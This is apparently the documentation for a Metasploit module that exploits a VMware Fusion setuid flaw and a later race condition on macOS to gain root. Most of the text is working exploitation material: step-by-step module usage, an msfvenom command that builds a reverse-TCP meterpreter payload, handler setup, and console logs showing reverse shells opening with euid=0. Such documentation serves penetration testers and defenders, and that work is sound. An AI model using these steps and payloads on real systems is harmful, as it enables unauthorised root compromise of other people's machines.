## Vulnerable Application

This exploits an improper use of setuid binaries within VMware Fusion 10.1.3 - 11.5.3. The `Open VMware USB Arbitrator Service` can be
launched outide of its standard path which allows loading of an attacker controlled binary. By creating a payload in the user home
directory in a specific folder, and creating a hard link to the `Open VMware USB Arbitrator Service`, we're able to launch it
temporarily to start our payload with an effective UID of 0.

Additional description can be found in
@mirchr's [exploit](https://raw.githubusercontent.com/mirchr/security-research/master/vulnerabilities/CVE-2020-3950.sh).

It was found that VMware Fusion 11.5.3, which patched the previous vulnerability utilized an incomplete patch.  The patch checked
for a correct code signature on the `VMware USB Arbitrator Service` at start, but not at launch, thus creating a TOCTOU race
condition.  The discoverer @jeffball55 demoed the exploit working in ~30 attempts.  This module has been successful between
5 and 25 attempts.

VMware Fusion 11.5.1 is available from [VMware](https://download3.vmware.com/software/fusion/file/VMware-Fusion-11.5.1-15018442.dmg).

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Get a shell
  4. Do: ```use exploit/osx/local/vmware_fusion_lpe```
  5. Do: ```set session #```
  6. Do: ```run```
  7. You should get a `euid=0` shell.

## Options

### MAXATTEMPTS

The maximum attempts to start `VMware USB Arbitrator Service`, attempting to win the race against 11.5.3.  Default is `75`.

### Session

Which session to use this exploit on.

## Scenarios

### VMware Fusion 10.1.6

```
msf5 exploit(osx/local/vmware_fusion_lpe) > run

[!] SESSION may not be compatible with this module.
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444
[+] Vmware Fusion 10.1.6 is exploitable
[*] Using pre-11.5.3 exploit
[*] Uploading Payload: /Users/wvu/Contents/Library/services/VMware USB Arbitrator Service
[*] Max line length is 131073
[*] Writing 804084 bytes in 25 chunks of 111592 bytes (octal-encoded), using printf
[*] Next chunk is 117552 bytes
[*] Next chunk is 116480 bytes
[*] Next chunk is 114764 bytes
[*] Next chunk is 113263 bytes
[*] Next chunk is 111420 bytes
[*] Next chunk is 112649 bytes
[*] Next chunk is 115231 bytes
[*] Next chunk is 113278 bytes
[*] Next chunk is 114696 bytes
[*] Next chunk is 114109 bytes
[*] Next chunk is 118500 bytes
[*] Next chunk is 119288 bytes
[*] Next chunk is 116736 bytes
[*] Next chunk is 114000 bytes
[*] Next chunk is 114444 bytes
[*] Next chunk is 114460 bytes
[*] Next chunk is 116528 bytes
[*] Next chunk is 112788 bytes
[*] Next chunk is 84713 bytes
[*] Next chunk is 106180 bytes
[*] Next chunk is 89744 bytes
[*] Next chunk is 87533 bytes
[*] Next chunk is 127271 bytes
[*] Next chunk is 71468 bytes
[*] Created folder (/Users/wvu/Bvr/k8h88/GAymi/) and link
[*] Starting USB Service (5 sec pause)
[*] Meterpreter session 2 opened (127.0.0.1:4444 -> 127.0.0.1:63876) at 2020-04-02 11:00:59 -0500
[+] Deleted /Users/wvu/Contents/Library/services/VMware USB Arbitrator Service
[*] Killing service
[*] Deleting /Users/wvu/Bvr

meterpreter > getuid
Server username: wvu @ [redacted] (uid=[redacted], gid=[redacted], euid=0, egid=[redacted])
meterpreter >
```

### VMware Fusion 11.5.1 (15018442) on macOS 10.15.3 (19D76)

```
/msfvenom --payload python/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=8888 -b "\x00" -o /var/www/html/meterp_8888.py
```

```
[*] Processing fusion.rb for ERB directives.
resource (fusion.rb)> setg verbose true
verbose => true
resource (fusion.rb)> use exploit/multi/handler
resource (fusion.rb)> set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp
resource (fusion.rb)> setg lhost 1.1.1.1
lhost => 1.1.1.1
resource (fusion.rb)> set lport 8888
lport => 8888
resource (fusion.rb)> exploit
[+] Vmware Fusion 11.5.1 is exploitable
[*] The target appears to be vulnerable.
[*] Started reverse TCP handler on 1.1.1.1:8888
[*] Sending stage (53755 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:8888 -> 2.2.2.2:49265) at 2020-03-23 18:07:57 -0400

meterpreter > getuid
Server username: h00die
meterpreter > sysinfo
Computer        : h00dies-MBP.doman
OS              : Darwin 19.3.0 Darwin Kernel Version 19.3.0: Thu Jan  9 20:58:23 PST 2020; root:xnu-6153.81.5~1/RELEASE_X86_64
Architecture    : x64
System Language : en_US
Meterpreter     : python/osx
meterpreter > background
[*] Backgrounding session 1...
```

```
resource (fusion.rb)> use exploit/osx/local/vmware_fusion_lpe
resource (fusion.rb)> set session 1
session => 1
resource (fusion.rb)> exploit

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 1.1.1.1:4444
[+] Vmware Fusion 11.5.1 is exploitable
[*] Using pre-11.5.3 exploit
[*] Uploading Payload: /Users/h00die/Contents/Library/services/VMware USB Arbitrator Service
[*] Creating folder (/Users/h00die/2KLH/s0m/wX8XO/) and link
[*] Starting USB Arbitrator Service (5 sec pause)
[*] Meterpreter session 2 opened (1.1.1.1:4444 -> 2.2.2.2:49269) at 2020-03-23 18:08:14 -0400
[+] Deleted /Users/h00die/Contents/Library/services/VMware USB Arbitrator Service
[*] Killing service
[*] Deleting /Users/h00die/2KLH

meterpreter > getuid
Server username: h00die @ h00dies-MBP.domain (uid=501, gid=20, euid=0, egid=20)
meterpreter > sysinfo
Computer     : h00dies-MBP.domain
OS           : macOS Unknown (macOS 10.15.3)
Architecture : x86
BuildTuple   : x86_64-apple-darwin
Meterpreter  : x64/osx

```

### VMWare Fusion 11.5.3 on macOS 10.15.3

```
resource (fusion.rb)> setg verbose true
verbose => true
resource (fusion.rb)> use exploit/multi/handler
resource (fusion.rb)> set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp
resource (fusion.rb)> setg lhost 1.1.1.1
lhost => 1.1.1.1
resource (fusion.rb)> set lport 8888
lport => 8888
resource (fusion.rb)> exploit
[*] Started reverse TCP handler on 1.1.1.1:8888
[*] Sending stage (53755 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:8888 -> 2.2.2.2:49198) at 2020-03-28 07:37:16 -0400

meterpreter > getuid
Server username: h00die
meterpreter > sysinfo
Computer        : h00dies-MBP.ragedomain
OS              : Darwin 19.3.0 Darwin Kernel Version 19.3.0: Thu Jan  9 20:58:23 PST 2020; root:xnu-6153.81.5~1/RELEASE_X86_64
Architecture    : x64
System Language : en_US
Meterpreter     : python/osx
meterpreter > background
[*] Backgrounding session 1...
```

```
resource (fusion.rb)> use exploit/osx/local/vmware_fusion_lpe
resource (fusion.rb)> set session 1
session => 1
resource (fusion.rb)> exploit

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 1.1.1.1:4444
[+] Vmware Fusion 11.5.3 is exploitable
[*] Using 11.5.3 exploit
[*] Uploading Payload to /Users/h00die/Contents/Library/services/SAGgama
[*] Uploading race condition executable.
[*] Writing '/Users/h00die/Contents/Library/services/TVOK7bDP' (342 bytes) ...
[*] Creating folder (/Users/h00die/weGd/JvR/VoYDt/) and link
[*] Writing '/Users/h00die/Contents/Library/services/alYnwGRyo' (178 bytes) ...
[*] Launching Exploit /Users/h00die/Contents/Library/services/alYnwGRyo
[*] attempt 1
[*] Exploit Finished, killing
[*] Meterpreter session 2 opened (1.1.1.1:4444 -> 2.2.2.2:49213) at 2020-03-28 07:37:28 -0400
[-] Unable to delete /Users/h00die/Contents/Library/services/VMware USB Arbitrator Service
[+] Deleted /Users/h00die/Contents/Library/services/TVOK7bDP
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_fs_delete_dir: Operation failed: Python exception: OSError
[*] Exploit completed, but no session was created.
msf5 exploit(osx/local/vmware_fusion_lpe) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: h00die @ h00dies-MBP.ragedomain (uid=501, gid=20, euid=0, egid=20)
meterpreter > sysinfo
Computer     : h00dies-MBP.ragedomain
OS           : macOS Unknown (macOS 10.15.3)
Architecture : x86
BuildTuple   : x86_64-apple-darwin
Meterpreter  : x64/osx
meterpreter >
```
